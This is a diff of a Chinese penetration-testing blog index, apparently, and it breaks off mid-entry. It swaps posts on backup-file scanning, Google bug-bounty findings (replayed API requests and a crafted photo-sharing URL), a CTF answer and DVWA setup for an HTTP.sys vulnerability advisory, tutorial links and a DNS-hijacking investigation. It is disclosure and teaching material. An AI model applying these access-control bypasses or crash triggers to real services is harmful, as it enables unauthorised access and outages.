@@ -138,179 +138,59 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
-                <a class="clearlink" href="15453600721143.html">
+                <a class="clearlink" href="15550584590400.html">
                 
-                  <h1>扫描网站备份文件思路</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<p>sk15大佬提供一个思路，使用备份文件名list+域名list2扫描，这样每次循环都是一个备份文件名扫描list2次。<br/>
-如果使用域名list2+备份文件名list1则每次循环都是一个域名就会扫描list1次（这样由于请求频次高容易导致服务器宕机）</p>
-
-<p>大佬还提供了一个更有意思的方法，将list1和list2做成一个list，然后将其打乱，再扫描。（骚思路就像好算法，是编程的精髓。）</p>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2018/12/21 10:41 上午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
-			<div class="article">
-                <a class="clearlink" href="15447676167973.html">
-                
-                  <h1>我是如何从Google窃取你的照片的-我的3个Google漏洞赏金报告分享</h1>
+                  <h1>HTTP.sys远程代码执行漏洞</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>文章转载自：<a href="https://nosec.org/home/detail/2063.html">https://nosec.org/home/detail/2063.html</a></p>
+<p>转载自：<a href="http://www.cnvd.org.cn/webinfo/show/3614">http://www.cnvd.org.cn/webinfo/show/3614</a></p>
 </blockquote>
 
-<p>安全是一个非常宏大的主题，在找到第一个漏洞之前，您不能确定您拥有安全人员所需的知识、运气和耐心。作为一个新手，加入漏洞赏金猎人俱乐部是件很困难的事，在这里，让我和你分享我的故事。</p>
+<p>4月14日，微软月度例行安全公告披露一个HTTP.sys远程代码执行漏洞（CNVD-2015-02422，对应CVE-2015-1635）,主要威胁到IIS服务器的安全。该漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，攻击者可以在系统帐户的上下文中执行任意代码或提升权限。目前，互联网已经出现了可以使服务器蓝屏的利用代码，不过可导致控制服务器主机的攻击代码还未出现。</p>
 
-<h2 id="toc_0">邀请欺诈</h2>
+<h2 id="toc_0">这漏洞能干啥</h2>
 
-<p>我的第一个漏洞是意外发现的，就在我试图和老师共享一个Google电子表格程序时。当时，我发送共享邀请到他的非Gmail电子邮件地址，然后用e-mail将链接发给他。当然，他无法访问它……幸运的是，Google非常强大，在这种情况下（当您试图打开一个不与您共享的文档时），曝出的错误消息下面有一个Request access 按钮，其功能是向共享文件所有者发送电子邮件，其中包含的链接如下：</p>
+<p>IIS 是 windows 主机上的 Web 服务程序，支持 asp、jsp 脚本，应用广泛漏洞众多。IIS服务进程依赖HTTP.sys内核驱动程序文件。漏洞产生的原因是HTTP.sys未能正确分析经特殊设计的HTTP请求所致，通过发送特定构造的HTTP请求包（如：在请求包中相关字段包含类似0xFFFFFFFFFFFFFFFF的大整数值参数），导致整数溢出。成功利用后，攻击者有可能在系统帐户的上下文中执行任意代码，导致拒绝服务或提取权限。目前相关分析表明，漏洞的溢出只限于整数型参数，直接构造可执行系统指令的攻击代码还有一定的难度。</p>
 
-<p><code>https://docs.google.com/spreadsheets/d/cmFuZG9t_c3ByZWFkc2hlZXQ_aWQ/edit?usp=sharing_erp&amp;userstoinvite=billgates@microsoft.com</code></p>
+<p>漏洞评级“高危”，因为被攻击会导致服务器蓝屏死机呀。</p>
 
-<p>如果共享文件所有者打开上面的链接，则会加载文档，并弹出一个“与其他人共享”模式，该模式自填充了一个来自URL的电子邮件地址：</p>
+<h2 id="toc_1">影响范围</h2>
 
-<p><figure><img src="media/15447676167973/15447677231852.png" alt=""/></figure></p>
+<p>受影响操作系统的IIS服务器版本如下所示：<br/>
+WindowsServer 2012<br/>
+WindowsServer 2012 R2<br/>
+用于基于32位系统：<br/>
+Windows7 SP1<br/>
+Windows8<br/>
+用于基于x64位系统：<br/>
+Windows7 SP1<br/>
+Windows8<br/>
+Windows8.1<br/>
+WindowsServer 2008 R2 SP1<br/>
+用于基于 Itanium 的系统:<br/>
+WindowsServer 2008 R2 SP1</p>
 
-<p>我的第一个想法是“嗯……用户的输入反映在DOM中——我应该尝试XSS吗？但我的第二个念头立刻涌现：“我决不是第一个发现这点的人。”这是谷歌，世界上有很多比我更聪明的人一直在尝试攻击它。我不会把时间浪费在XSS上…”</p>
+<h2 id="toc_2">漏洞修复建议</h2>
 
-<p>你可以称我为悲观主义者，但是我最近读过一些关于Google XSS漏洞的文章，我知道找到XSS的难度有多大。但是，这个url的其他一些东西引起了我的注意……参数的名称是userStoinvite，而不是usertoinvite，这意味着这个url可以用来同时邀请更多的用户，对吧？</p>
+<p>补丁：<a href="https://support.microsoft.com/zh-cn/kb/3042553">https://support.microsoft.com/zh-cn/kb/3042553</a><br/>
+装完后要重启才会生效</p>
 
-<p>我开始测试这个参数，并且很快发现，如果我用逗号分隔多个电子邮件地址并添加到url中，那它们将都出现在表单中。就像你想给多个收件人发邮件一样……现在，让我看看如果我指定一个名字而不是电子邮件地址时会发生什么：</p>
+<p>一些系统管理员在部署微软的Server系统时可能不作为Web服务器使用，但有可能在默认安装了IIS，请相关单位用户注意排查。</p>
 
-<p><code>https://docs.google.com/spreadsheets/d/cmFuZG9t_c3ByZWFkc2hlZXQ_aWQ/edit?usp=sharing_erp&amp;userstoinvite=Bill Gates&lt;billgates@microsoft.com&gt;</code></p>
+<h2 id="toc_3">验证该漏洞注意事项</h2>
 
-<p>它正如我所预期的那样——表单中显示的是名字而不是地址，只有当您将鼠标移到名称时才会显示真正的电子邮件地址。</p>
+<p>网络流传的poc可能导致服务器蓝屏死机，请谨慎验证......别把线上业务搞挂了。</p>
 
-<p><figure><img src="media/15447676167973/15447678384880.png" alt=""/></figure></p>
+<h2 id="toc_4">参考链接</h2>
 
-<h2 id="toc_1">这会带来什么问题？</h2>
+<p><a href="https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspx">https://technet.microsoft.com/zh-CN/library/security/ms15-034.aspx</a></p>
 
-<p>如果使用伪造的电子邮件地址代替你的姓名，则可以设计一个分享邀请欺诈，欺骗没有防范经验的用户允许你访问他的文件。攻击场景：</p>
+<p><a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1635">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-1635</a></p>
 
-<p>您不再为公司工作，对重要电子表格的访问权限被撤销，但是您仍然知道访问的URL（例如，在浏览器历史中）</p>
-
-<p>用老板的电子邮件地址给秘书/会计发送一个虚假的共享邀请链接</p>
-
-<p>等待直到他们打开链接并允许您访问文件</p>
-
-<p>时间线：<br/>
-2017.10.03-漏洞报告<br/>
-2017.10.03-漏洞由安全工程师验证（P4-&gt;P3）<br/>
-2017.10.10-500美元奖金<br/>
-2018.01.16-漏洞修复</p>
-
-<h2 id="toc_2">从你的谷歌驱动中获取照片</h2>
-
-<p>在我发现第一个漏洞后，我的感觉好坏参半。一方面，我感到非常自豪和高兴，因为我在谷歌发现了一个安全问题，我也真的很感激这笔奖金。另一方面，我对自己并不满意，因为任何人只要运气好发过这样一封邮件，就会发现这个漏洞——我觉得我可以做得更好。但是从哪里开始呢？我敢肯定使用自动化工具会浪费时间，因为我认为其他人已经做过很多次，我想尝试一些不同的东西。我想我对web的基本概念（如SOP和CORS）有很好的理解，因为我真的爱上了Chrome Dev工具，所以我决定开始在JS文件中寻找不安全的API接口或敏感数据。我的代码如下：</p>
-
-<pre class="line-numbers"><code class="language-text">for webapp in literally_every_online_google_product_I_have_found:
-    devtools.open()
-    devtools.select_tab(&#39;network&#39;)
-    for button in webapp:
-        button.click()
-    for request, response in devtools.requests:
-        request.analyze_manually()
-        response.analyze_manually()
-</code></pre>
-
-<p>整个过程又长又无聊。我花了下午和晚上阅读发起的网络请求和回复，但没有成功。我甚至不记得我尝试过多少不同的测试：</p>
-
-<p>“也许这个CSS存在一些漏洞……那些字体如何？”<br/>
-“好的，如果我用另一个帐户的cookie回放这个请求会咋样？”“<br/>
-“嗯，我可以在这里上传SVG。是时候测试一些XSS了”。</p>
-
-<p>最后我关注了Drive和Google Docs系列应用，因为它们是相互连接的（Docs可以访问您的文件），很流行（因此出现安全缺陷就意味着严重安全威胁），并且它们有很多特性和设置。我首先注意到的是，Slides确实类似于文档和表格，但是它在不同的情况下了使用了不同的（遗留？）API接口。例如，当从我的驱动器插入一张图像时会触发这两个请求：</p>
-
-<pre class="line-numbers"><code class="language-text">curl &#39;https://docs.google.com/presentation/d/pReS3nTaT10N_1D/copyimages?id=bG9s_Y2hlY2tvdXR0aGlz_dDY4UkV1MEh3Qnc&#39; --data &#39;photo=bG9s_Y2hlY2tvdXR0aGlz_dDY4UkV1MEh3Qnc&#39;
-
-{&quot;bG9s_Y2hlY2tvdXR0aGlz_dDY4UkV1MEh3Qnc&quot;:&quot;MDRjYWVhO-QtYjc0Ny00NDdkLWJlODctZ-VmNzVkOTI1YTkw&quot;}
-
----
-
-curl &#39;https://docs.google.com/presentation/d/pReS3nTaT10N_1D/renderdata?id=bG9s_Y2hlY2tvdXR0aGlz_dDY4UkV1MEh3Qnc&#39; --data &#39;cosmoId=MDRjYWVhO-QtYjc0Ny00NDdkLWJlODctZ-VmNzVkOTI1YTkw&#39;
-
-{&quot;r0&quot;:&quot;https://lh6.googleusercontent.com/dmVyeXZlcnl2ZXJ5dmVyeXZlcnl2ZXJ5dmVyeXZlcnl2ZXJ5dmVyeXZlcnl2ZXJ5dmVyeXZlcnl2ZXJ5dmVyeXZlcnl2ZXJ5dmVyeXZlcnl2ZXJ5bG9uZ3N0cmluZw&quot;}
-</code></pre>
-
-<p>你应该也注意到，第一个响应包含有&quot;ID_OF_THE_IMAGE&quot;:&quot;SOME_RANDOM_ID&quot;, 而“SOME_RANDOM_ID”出现在第二个倾请求的cosmoId参数的值中。而且，第二个响应也包含图片链接。</p>
-
-<p>我真的不明白使用两个API接口处理图像的原因，感觉有点过于复杂——这就是为什么我认为Slides有一些值得关注的遗留问题。接下来，我用不同的cookie回放了上面的这些请求。</p>
-
-<p>幸运的是，这些接口缺乏权限控制，所以只要添加一个有效的谷歌会话cookie，我可以从任何驱动器得到任何图片的URL（如果我有文件的ID）！</p>
-
-<p>这听起来很酷，但事实是这些图像ID是很长的，并且包含大小写字符。这就是为什么我想不出什么可怕的攻击场景，这也是这个漏洞奖励相对较低的原因。</p>
-
-<p>时间线：<br/>
-2017.11.27-漏洞报告<br/>
-2017.12.09-漏洞由安全工程师验证（P3-&gt;P1）<br/>
-2018.01.09-500美元奖金<br/>
-2018.01.16-漏洞修复</p>
-
-<p>在模拟环境中，您可以看到这个漏洞是如何工作的（<a href="https://platform.avatao.com/challenges/630fa4fc-3138-4805-bd78-ea85e492c2e2%EF%BC%89%E3%80%82">https://platform.avatao.com/challenges/630fa4fc-3138-4805-bd78-ea85e492c2e2）。</a></p>
-
-<h2 id="toc_3">请登录后给我你的照片</h2>
-
-<p>在这两次漏洞之后，我休息了一段时间，因为我觉得我已经用尽了所有的运气，需要一些时间来恢复。在五月，我决定再尝试试一次，在3个小时内，我发现了一个可怕的漏洞。我认为这个漏洞太强了以至于不可能是真的，所以我在报告它之前检查了三四次。</p>
-
-<p>在我第一次安全测试时，不知何故我跳过了Google Photos，所以这次我用我的老方法开始集中精力寻找它的漏洞。</p>
-
-<p>“网络”选项卡上没有什么值得注意的地方，但“共享库（自动与伙伴共享照片）特性”看起来很有希望。如果你想建立合伙人账户，你必须先输入合伙人的电子邮件地址。提交之后，会出现一个带有Google帐户登录页面的弹出窗口。最后，您需要输入您的登入凭证，然后您的照片将被共享，并且您将被重定向到仅包含“成功消息”以及一个“关闭窗口”按钮的页面。弹出窗口的过小使我无法看到整个URL，所以我把它复制到记事本以便进一步研究：</p>
-
-<pre class="line-numbers"><code class="language-text">// URL before login
-https://accounts.google.com/signin/v2/sl/pwd?passive=801337085&amp;osid=1&amp;continue=https%3A%2F%2Fphotos.google.com%2Finitps%3Frequest%3DW1tudWxsLCIxMjU4NzQyNzU5MTIzOSJdLG51bGwsImUtbWFpbEBleGFtcGxlLmNvbSIsbnVsbCxbMixudWxsLCJXVzkxSUhKbFlXeHNlU0JzYVd0bElfR1JsWTI5a2FXNW5JSEpoYm1SdmJTQmlZWE5sTmpRZ2MzX1J5YVc1bmN5QXRJR1J2YmlkMElIbHZkVDgiXV0.
-
-// URL after login
-https://photos.google.com/initps?request=W1tudWxsLCIxMjU4NzQyNzU5MTIzOSJdLG51bGwsImUtbWFpbEBleGFtcGxlLmNvbSIsbnVsbCxbMixudWxsLCJXVzkxSUhKbFlXeHNlU0JzYVd0bElfR1JsWTI5a2FXNW5JSEpoYm1SdmJTQmlZWE5sTmpRZ2MzX1J5YVc1bmN5QXRJR1J2YmlkMElIbHZkVDgiXV0.
-</code></pre>
-
-<p>显然，在continue参数被编码包含在第二个URL中，乍一看，request的值只是一组随机字符，末尾跟有一个点。这个点好像没有任何意义——为什么它只出现在最后，像填充物一样？如果它是一个等号，那么‘request’的值很可能就是一个经过ba se64编码的字符串……所以我修改了它，并将修改后的字符串粘贴到一个ba se64解码器中，看看这段字符串的明文是啥：</p>
-
-<pre class="line-numbers"><code class="language-text">[[null,&quot;12587427591239&quot;],null,&quot;e-mail@example.com&quot;,null,[2,null,&quot;WW91IHJlYWxseSBsaWtlI_GRlY29kaW5nIHJhbmRvbSBiYXNlNjQgc3_RyaW5ncyAtIGRvbid0IHlvdT8&quot;]]
-</code></pre>
-
-<p>我把其中的电子邮件改成了我自己的（不修改其他值），然后重新编码，并用点替换了最后的等号。并在我登录我的第二个帐户之后打开这个精心编制的URL，照片立刻被和第一个帐户共享。最棒的是，我甚至没有收到任何警告/通知/电子邮件。我迫不及待的想进一步分析漏洞。并且测试如果你直接访问第二个URL会发生什么——您甚至不需要登录就可以与攻击者共享您的图片，因为只要向发送第二个URL的GET请求就足够了。</p>
-
-<p>时间线：<br/>
-2018.05.12-漏洞报告<br/>
-2018.05.14-漏洞由安全工程师验证（P4-&gt;P2，P2-&gt;P1）<br/>
-2018.05.22-3133.70美元奖金<br/>
-2018.08.22-漏洞修复</p>
-
-<p>尝试使用我们的模拟环境，可以更好地理解这种漏洞。（<a href="https://platform.avatao.com/challenges/e069a6c1-8265-4115-9126-f8e188c62765%EF%BC%89">https://platform.avatao.com/challenges/e069a6c1-8265-4115-9126-f8e188c62765）</a></p>
-
-<p>最难的部分是不知道我们的目标是啥，这在大多数其他的漏洞悬赏项目中也一样。我从这些情况中得到的启发是，不要把自己局限于特定的漏洞，比如XSS或SQLi。要睁大眼睛，富有创造力。</p>
-
-<h2 id="toc_4">关于作者</h2>
-
-<p>Gergő是Avatao团队的第一批成员之一，现在他是我们最好的软件工程师之一。在大学，他对网络安全开始感兴趣并延续至今。他在Avatao平台上开发漏洞环境，同时还负责指导其他开发者。当然，空闲时他也会寻找漏洞。</p>
-
-<p>原文：<a href="https://blog.avatao.com/How-I-could-steal-your-photos-from-Google/">https://blog.avatao.com/How-I-could-steal-your-photos-from-Google/</a></p>
+<p><a href="http://bobao.360.cn/news/detail/1435.html?from=groupmessage&amp;isappinstalled=0">http://bobao.360.cn/news/detail/1435.html?from=groupmessage&amp;isappinstalled=0</a></p>
 
                         
                       </div>
@@ -319,7 +199,7 @@ https://photos.google.com/initps?request=W1tudWxsLCIxMjU4NzQyNzU5MTIzOSJdLG51bGw
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/14 14:6 下午</span>
+                    <span class="date">2019/4/12 16:40 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -336,17 +216,23 @@ https://photos.google.com/initps?request=W1tudWxsLCIxMjU4NzQyNzU5MTIzOSJdLG51bGw
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15446978130922.html">
+                <a class="clearlink" href="15507295741483.html">
                 
-                  <h1>enigmagroup入门挑战-基础1</h1>
+                  <h1>最强渗透测试教程</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
-                        	<p><a href="http://challenges.enigmagroup.org/basics/pre/1/">基础1题目地址</a><br/>
-1、右键查看源码<br/>
-2、ctrl+f查找passw<br/>
-3、注释里面说了：<code>&lt;!-- the first levels are easy, the password is 39f13b --&gt;</code></p>
+                        	<p>作者：Micropoor 侯总<br/>
+作者简介：十多年一线渗透测试大牛，目前在职于360.<br/>
+侯总博客：<br/>
+<a href="https://blog.csdn.net/micropoor">https://blog.csdn.net/micropoor</a><br/>
+<a href="https://micropoor.blogspot.com/%EF%BC%88%E9%9C%80%E8%A6%81%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%EF%BC%89">https://micropoor.blogspot.com/（需要科学上网）</a><br/>
+侯总教程地址：<br/>
+<a href="https://github.com/Micropoor/Micro8">https://github.com/Micropoor/Micro8</a></p>
+
+<p>经典语录：<br/>
+渗透的本质是信息搜集。</p>
 
                         
                       </div>
@@ -355,7 +241,7 @@ https://photos.google.com/initps?request=W1tudWxsLCIxMjU4NzQyNzU5MTIzOSJdLG51bGw
                 <div class="read-more clearfix">
                   <div class="more-left left">
                   
-                    <span class="date">2018/12/13 18:43 下午</span>
+                    <span class="date">2019/2/21 14:12 下午</span>
                     <span>posted in&nbsp;</span> 
           				  
           					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
@@ -372,324 +258,401 @@ https://photos.google.com/initps?request=W1tudWxsLCIxMjU4NzQyNzU5MTIzOSJdLG51bGw
               </div><!-- article -->
         
 			<div class="article">
-                <a class="clearlink" href="15446897185202.html">
+                <a class="clearlink" href="15506293038772.html">
                 
-                  <h1>从零开始的DVWA之环境搭建</h1>
+                  <h1>使用浏览器进行Web应用安全测试</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>本指南写的是在不使用扩展和代理的情况下，仅使用浏览器自带功能就能进行安全检测任务。<br/>
+非常值得一读。</p>
+
+<p><a href="https://getmantra.com/web-app-security-testing-with-browsers/#useragentchrome">Web app security testing with browsers</a></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/2/20 10:21 上午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
+                <a class="clearlink" href="15505564665657.html">
+                
+                  <h1>深入了解最近普遍存在的DNS劫持攻击事件</h1>
                   <div class="a-content">
                       
                       <div class="a-content-text">
                         
                         	<blockquote>
-<p>文章写于2017年7月6日，很久之前的东西了。</p>
+<p>文章摘抄自<a href="https://krebsonsecurity.com/2019/02/a-deep-dive-on-the-recent-widespread-dns-hijacking-attacks/">A Deep Dive on the Recent Widespread DNS Hijacking Attacks</a>，中文翻译由谷歌翻译提供。</p>
 </blockquote>
 
-<h2 id="toc_0">0X01 主机配置</h2>
+<p>美国政府 - 以及一些领先的安全公司 - 最近警告说，一系列高度复杂和广泛的攻击使得可疑的伊朗黑客窃取了来自多个政府和私营公司的大量电子邮件密码和其他敏感数据。但到目前为止，这次袭击究竟是如何发生袭击以及谁被击中的细节依然笼罩在保密之中。</p>
 
-<p>　　操作系统：Ubuntu-Kylin-16.04-LTS_x64（VritualBox虚拟机）<br/><br/>
-　　相关组件：XAMPP+DVWA    </p>
+<p>这篇文章旨在记录这些攻击的程度，并将这一绝对成功的网络间谍活动的起源追溯到关键互联网基础设施提供商的一系列连锁违规行为。</p>
 
-<h2 id="toc_1">0X02 DVWA简介</h2>
+<p><figure><img src="media/15505564665657/15505565989858.jpg" alt=""/></figure></p>
 
-<p>　　DVWA是一个用来进行安全脆弱性鉴定（练习挖洞）的PHP/MySQL应用。旨在帮助安全爱好者（黑客白客红客白帽子黑帽子绿帽子等）测试自己的专业技能和工具提供合法的环境（不要瞎搞别人网站，这样不好...），提升技术能力的同时更好的维护比特世界的和平。       </p>
+<p>在我们深入研究在这篇文章中达到高潮的广泛研究之前，回顾到目前为止公开披露的事实是有帮助的。在2018年11月27日，思科的Talos研究部门<a href="https://blog.talosintelligence.com/2018/11/dnspionage-campaign-targets-middle-east.html">发表了一篇文章</a>，概述了一项名为“ DNSpionage ” 的复杂网络间谍活动的轮廓。</p>
 
-<h2 id="toc_2">0X03 XAMPP简介</h2>
+<p>该名称的DNS部分是指全球“ <a href="https://en.wikipedia.org/wiki/Domain_Name_System">D omain N ame S ystem</a> ”，它通过将人性化的网站名称（example.com）转换为更容易的数字Internet地址，作为互联网的一种电话簿。供计算机管理。</p>
 
-<p>　　XAMPP（Apache+MySQL+PHP+PERL）是一个功能强大的建站集成软件包。这个软件包原来的名字是 LAMPP，但是为了避免误解，最新的几个版本就改名为 XAMPP 了。由于DWVA需要PHP环境，嗯，就由XAMMP来守护了。    </p>
+<p>Talos表示，DNSpionage的肇事者能够通过劫持这些目标的DNS服务器来窃取黎巴嫩和阿拉伯联合酋长国的一些政府和私营部门实体的电子邮件和其他登录凭证，以便所有电子邮件和虚拟专用网络（VPN） ）流量被重定向到攻击者控制的Internet地址。</p>
 
-<h2 id="toc_3">0X04 XAMPP和DVWA安装</h2>
+<p>Talos报告称，这些DNS劫持还为攻击者获取目标域的SSL加密证书铺平了道路（例如webmail.finance.gov.lb），这使得他们能够解密截获的电子邮件和VPN凭证并以纯文本格式查看。</p>
 
-<p>　　首先访问官网 <a href="https://www.apachefriends.org/zh_cn/download.html">https://www.apachefriends.org/zh_cn/download.html</a> 然后点击下载：<br/><br/>
-<figure><img src="media/15446897185202/1.png" alt="1"/></figure></p>
+<p>在2019年1月9日，安全厂商FireEye <a href="https://www.fireeye.com/blog/threat-research/2019/01/global-dns-hijacking-campaign-dns-record-manipulation-at-scale.html">发布了其报告</a> “全球DNS劫持活动：大规模DNS记录操作”，该报告对于间谍活动的“方式”进行了更为详尽的技术细节，但其中包含的其他细节很少。受害者。</p>
 
-<p>接着就会弹个框：<br/><br/>
-<figure><img src="media/15446897185202/2.png" alt="2"/></figure></p>
+<p>与FireEye报告大致同时，美国国土安全部发布了一项罕见的紧急指令，<a href="https://cyber.dhs.gov/blog/#why-cisa-issued-our-first-emergency-directive">命令</a>所有美国联邦民用机构保护其互联网域名记录的登录凭证。作为该任务的一部分，DHS发布了DNSpionage活动中使用的域名和Internet地址的简短列表，尽管这些细节并未超出Cisco Talos或FireEye之前发布的内容。</p>
 
-<p>去一趟茅房回来就下完了，你要是嫌弃7下的太慢，可以去下5.6，速度会快些，接着就是安装。　　　　<br/>
-　　安装过程如下（记得加权限，然后）：　　　　<br/>
-<figure><img src="media/15446897185202/3.png" alt="3"/></figure><br/>
-　　　　<br/>
-<figure><img src="media/15446897185202/4.png" alt="4"/></figure><br/>
-　<br/>
-一直点击next就行了……　　　　<br/>
-<figure><img src="media/15446897185202/5.png" alt="5"/></figure><br/>
-　　　<br/>
-　　这里告诉我们XAMPP被安装在/opt/lampp文件（linux一切皆文件）里面。最后点击Finish就完成了安装。<br/><br/>
-启动XAMPP    </p>
+<p>这种情况在2019年1月25日发生了变化，当时安全公司CrowdStrike <a href="https://www.crowdstrike.com/blog/widespread-dns-hijacking-activity-targets-multiple-sectors/">发布了一篇博文</a>，列出了迄今为止间谍活动所使用的几乎所有互联网地址。本篇文章的其余部分基于KrebsOnSecurity进行的开源研究和访谈，旨在更加了解这种非同寻常的持续攻击的真实程度。</p>
 
-<pre class="line-numbers"><code class="language-shell">#cd /opt/lampp
-#./manager-linxu-x64.run
-或者
-#/opt/lamp/./manage-linux-x64.run  
+<p><figure><img src="media/15505564665657/15505567298359.jpg" alt=""/></figure></p>
+
+<p>与CrowdStrike发布的DNSpionage活动相关的“妥协指标”。</p>
+
+<h2 id="toc_0">被动DNS</h2>
+
+<p>我开始研究CrowdStrike报告中列出的每个互联网地址，并通过<a href="https://www.farsightsecurity.com/">Farsight Security</a>和<a href="https://securitytrails.com/">SecurityTrails</a>运行它们，这些服务被动地收集有关与全球数千万个网站域相关的DNS记录变化的数据。</p>
+
+<p>从每个互联网地址向后工作，我能够看到，在2018年的最后几个月，DNSpionage背后的黑客成功地破坏了50多个中东公司和政府机构的DNS基础设施的关键组件，包括塞浦路斯阿尔巴尼亚的目标，埃及，伊拉克，约旦，科威特，黎巴嫩，利比亚，沙特阿拉伯和阿拉伯联合酋长国。</p>
+
+<p>例如，被动DNS数据显示攻击者能够劫持mail.gov.ae的DNS记录，mail.gov.ae处理阿拉伯联合酋长国政府办公室的电子邮件。以下是此网络间谍活动中成功入侵的其他一些有趣资产：</p>
+
+<pre class="line-numbers"><code class="language-text">-nsa.gov.iq：伊拉克国家安全咨询
+-webmail.mofa.gov.ae：阿拉伯联合酋长国外交部电子邮件
+-shish.gov.al：阿尔巴尼亚国家情报局
+-mail.mfa .gov.eg：埃及外交部邮件服务器
+-mod.gov.eg：埃及国防部
+--embassy.ly：利比亚大使馆
+-owa.e-albania.al：电子邮件的Outlook Web Access门户网站阿尔巴尼亚政府门户网站
+-mail.dgca.gov.kw：科威特民航局的电子邮件服务器
+-gid.gov.jo：约旦的综合情报总局
+-adpvpn.adpolice.gov.ae：阿布扎比警方的VPN服务
+-mail.asp.gov.al:Albanian State Police的电子邮件
+-owa.gov.cy：塞浦路斯政府的Microsoft Outlook Web Access 
+-webmail.finance.gov.lb：黎巴嫩财政部的电子邮件
+-mail.petroleum.gov .eg：埃及石油部
+-mail.cyta.com.cy:Cyta电信和互联网提供商，塞浦路斯
+-mail.mea.com.lb：中东航空公司的电子邮件访问
 </code></pre>
 
-<p><figure><img src="media/15446897185202/6.png" alt="6"/></figure></p>
+<p>Farsight和SecurityTrails提供的被动DNS数据也提供了关于何时每个域被劫持的线索。在大多数情况下，攻击者似乎已经更改了这些域的DNS记录（我们马上就会看到“如何”），以便这些域指向他们控制的欧洲服务器。</p>
 
-<p>下面我们开始安装DWVA：<br/><br/>
-　　首先我们登录官网 <a href="http://www.dvwa.co.uk/">http://www.dvwa.co.uk/</a> 点击DOWNLOAD下载最新版的DWVA，是一个zip文件。<br/><br/>
-<figure><img src="media/15446897185202/7.png" alt="7"/></figure></p>
-
-<p>然后将文件解压（提取）到/opt/lamp/htdocs/目录下<br/><br/>
-<figure><img src="media/15446897185202/8.png" alt="8"/></figure></p>
-
-<p><figure><img src="media/15446897185202/9.png" alt="9"/></figure></p>
-
-<p>接着我们打开XAMPP的MySQL（默认只开了Apache）<br/><br/>
-<figure><img src="media/15446897185202/10.png" alt="10"/></figure></p>
-
-<p>然后访问 http://localhost/DVWA-master/index.php 诶!?报错<br/><br/>
-<figure><img src="media/15446897185202/11.png" alt="11"/></figure></p>
+<p>在这些TLD的DNS记录被劫持后不久 - 有时几周，有时只有几天或几小时 - 攻击者能够从SSL提供商<a href="https://www.comodo.com/">Comodo</a>和/或<a href="https://letsencrypt.org/">Let&#39;s Encrypt</a>获取这些域的SSL证书。可以在<a href="https://crt.sh/">cert.sh</a>上看到针对其中几种攻击的准备工作，该数据库提供了所有新SSL证书创建的可搜索数据库。</p>
 
-<p>　　嗯，根据报错信息可知是配置文件有问题（废话啰），同样的根据提示我们知道要将文件名config.inc.php.dist改为config.inc.php（这里其实涉及到一个linux命令copy的用法，具体可自行百度： <a href="http://www.linuxdiyf.com/viewarticle.php?id=38590">http://www.linuxdiyf.com/viewarticle.php?id=38590</a> ）。改完名字之后就可以访问了，页面会自动跳转到： http://localhost/DVWA-master/setup.php 。然后我们用gedit打开这个文件config.inc.php看看是个什么东西，(⊙o⊙)哦原来是配置文件（废话连篇有木有），我们修改两个地方（1、数据库密码，我知道玩lol的你输入这个密码肯定飞快，不过我是玩dota的。2、安全等级设置为low，简单点容易玩，默认是难的。）     　<br/><br/>
-<figure><img src="media/15446897185202/12.png" alt="12"/></figure></p>
+<p>让我们仔细看一个例子。CrowdStrike报告引用了互联网地址**139.59.134[.]216 **（见上文），根据Farsight多年来，它只是七个不同领域的所在地。其中两个域名仅在2018年12月出现在该互联网地址，包括黎巴嫩的域名，以及 - 奇怪的是 - 瑞典。</p>
 
-<p>打开之后长这样：<br/><br/>
-<figure><img src="media/15446897185202/13.png" alt="13"/></figure></p>
+<p>第一个域是“ <strong>ns0.idm.net.lb</strong> ”，它是黎巴嫩互联网服务提供商IDM的服务器。从2014年初到2018年12月，ns0.idm.net.lb指向<strong>194.126.10[.]18</strong>，其中足够的是一个基于黎巴嫩的互联网地址。但正如我们在下面的Farsight数据截图中看到的那样，2018年12月18日，该ISP的DNS记录被更改为将指向IDM的互联网流量指向德国的托管服务提供商（ 139.59.134[.]216 地址）。</p>
 
-<p>怎么玩呢？我不知道啊，于是我瞎点了几下，<br/><br/>
-<figure><img src="media/15446897185202/14.png" alt="14"/></figure></p>
+<p><figure><img src="media/15505564665657/15505569469853.jpg" alt=""/></figure></p>
 
-<p>MMP又报错了，根据提示我们知道问题出在red部分,嗯，我们去修改一下所有带红色的地方的配置。<br/><br/>
-1、搞定PHP function allow_url_include：Disabled<br/><br/>
